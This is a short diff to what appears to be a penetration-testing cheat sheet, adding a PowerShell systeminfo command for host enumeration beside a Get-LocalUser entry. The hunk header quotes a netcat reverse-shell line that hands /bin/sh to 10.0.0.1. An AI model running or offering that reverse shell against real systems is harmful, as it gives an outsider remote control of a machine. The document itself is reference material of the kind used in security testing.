@@ -95,6 +95,12 @@ nc -e /bin/sh 10.0.0.1 1234
 
 
 #### PowerShell
+
+##### Get system info
+```powershell
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
+```
+
 ##### Get local users on a machine
 ```powershell
 Get-LocalUser
